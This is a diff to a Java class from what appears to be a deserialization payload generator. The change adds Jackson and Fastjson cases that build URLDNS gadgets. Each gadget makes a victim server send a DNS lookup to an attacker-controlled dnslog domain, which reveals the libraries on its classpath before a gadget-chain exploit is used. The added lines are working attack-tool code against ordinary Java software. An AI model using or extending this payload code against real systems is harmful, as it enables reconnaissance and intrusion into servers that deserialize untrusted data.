@@ -39,13 +39,13 @@ import java.util.List;
 public class URLDNS implements ObjectPayload<Object> {
     public static String[] defaultClass = new String[]{
             "CommonsCollections13567", "CommonsCollections24", "CommonsBeanutils2", "C3P0", "AspectJWeaver", "bsh",
-            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux"};
+            "Groovy", "Becl", "Jdk7u21", "JRE8u20", "winlinux", "jackson2100"};
 
     public static List<Object> list = new LinkedList();
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         String command = param[0];
-        int sep = command.lastIndexOf(':');
+        int    sep     = command.lastIndexOf(':');
         if (sep < 0) {
             throw new IllegalArgumentException("Command format is: <type>:<dnslog_url>");
         }
@@ -177,6 +177,14 @@ public class URLDNS implements ObjectPayload<Object> {
                 Object windows = getURLDNSGadget("windows." + dnsLog, "sun.awt.windows.WButtonPeer");
                 list.add(linux);
                 list.add(windows);
+                break;
+            case "jackson2100":
+                Object jackson2100 = getURLDNSGadget("jackson2100." + dnsLog, "com.fasterxml.jackson.databind.node.POJONode");
+                list.add(jackson2100);
+                break;
+            case "fastjson":
+                Object fastjson = getURLDNSGadget("fastjson." + dnsLog, "com.alibaba.fastjson.JSONArray");
+                list.add(fastjson);
                 break;
             case "all":
                 for (int i = 0; i < defaultClass.length; i++) {
